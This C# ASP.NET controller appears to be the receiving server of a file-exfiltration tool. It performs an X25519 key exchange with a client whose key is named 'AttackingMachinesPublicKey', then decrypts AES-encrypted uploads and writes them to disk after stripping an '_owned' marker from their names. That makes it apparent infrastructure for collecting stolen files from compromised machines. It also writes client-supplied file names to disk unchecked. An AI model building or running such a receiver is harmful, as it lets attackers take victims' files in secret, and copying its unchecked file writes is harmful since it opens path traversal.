using CasDotnetSdk.Hashers;
using CasDotnetSdk.KeyExchange;
using CasDotnetSdk.KeyExchange.Types;
using CasDotnetSdk.Symmetric;
using CasDotnetSdk.Symmetric.Types;
using Microsoft.AspNetCore.Mvc;
using Shared;
using System.Text;

namespace Receiver.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class EncryptionController : ControllerBase
    {
        [HttpPost("DiffieHellmanPublicKey")]
        public async Task<IActionResult> GetAesKey([FromBody] DiffieHellmanInitialExchangeRequest request)
        {
            X25519Wrapper x25519Wrapper = new X25519Wrapper();
            X25519SecretPublicKey x25519SecretPublicKey = x25519Wrapper.GenerateSecretAndPublicKey();
            X25519SharedSecret sharedSecret = x25519Wrapper.GenerateSharedSecret(x25519SecretPublicKey.SecretKey, request.AttackingMachinesPublicKey);


            AESWrapper aeswrapper = new AESWrapper();
            Aes256KeyAndNonceX25519DiffieHellman aseKeyAndNonce = aeswrapper.Aes256KeyNonceX25519DiffieHellman(sharedSecret.SharedSecret);

            SHAWrapper shaWrapper = new SHAWrapper();
            string newId = Convert.ToBase64String(shaWrapper.Hash512(Encoding.UTF8.GetBytes(Guid.NewGuid().ToString())));
            AesKeyResult keyResult = new AesKeyResult()
            {
                Key = aseKeyAndNonce.AesKey,
                Nonce = aseKeyAndNonce.AesNonce,
                Id = newId
            };
            ReceiverCache.connections.Add(newId, keyResult);
            DiffieHellmanInitialExchangeResponse response = new DiffieHellmanInitialExchangeResponse()
            {
                Id = newId,
                ServersPublicKey = x25519SecretPublicKey.PublicKey
            };
            return new OkObjectResult(response);
        }

        [HttpPost("AesEncryptedFile")]
        public async Task<IActionResult> AesEncryptedFile([FromBody]AesEncryptedFile encryptedFile)
        {
            AesKeyResult keyResult = ReceiverCache.connections.GetValueOrDefault(encryptedFile.Id);
            if (keyResult != null)
            {
                AESWrapper wrapper = new AESWrapper();
                byte[] plaintext = wrapper.Aes256DecryptBytes(keyResult.Nonce, keyResult.Key, encryptedFile.EncryptedBytes);
                string targetDir = Directory.GetCurrentDirectory();
                string[] fileName = encryptedFile.FileName.Split("_owned");
                System.IO.File.WriteAllBytes(targetDir + "/" + fileName[0] + fileName[1], plaintext);
                return new OkResult();
            }
            else
            {
                return new BadRequestObjectResult(new { error = "No Aes Key was generated on the server side" });
            }
        } 
    }
}
